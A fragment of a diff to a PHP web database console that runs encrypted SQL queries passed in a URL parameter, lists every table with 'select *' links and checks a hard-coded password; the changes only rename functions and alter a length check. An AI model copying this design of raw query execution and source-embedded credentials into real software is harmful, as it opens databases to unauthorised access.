@@ -9,7 +9,7 @@ if ($_SESSION['pass']==true)
 	else
 		{
 		if (isset($_GET['query']))
-			$q=variable_get('query');
+			$q=variable_get_ltd('query');
 		else
 			{
 			if ($_POST['mdp']!="X531_")
@@ -26,7 +26,7 @@ if ($_SESSION['pass']==true)
 		echo "<table><tr>";
 		foreach($tables as $table)
 			{
-			$cmd=encrypt("select * from $table");
+			$cmd=encrypt_ltd("select * from $table");
 			echo "<td>";
 			echo "<a href=\"?action=cmd_sql&query=$cmd\">";
 			echo "$table </a></td><td>|</td>";
@@ -87,7 +87,7 @@ if ($_SESSION['pass']==true)
 						{
 						if(intval($k) != 0 || $k == '0') continue;
 						
-						if ((strlen($v)>=12) && (strpos($v," ")===false) )
+						if ((strlen($v)>32) && (strpos($v," ")===false) )
 							{
 							$decrp=decrypt($v);
 							if ($decrp!="")
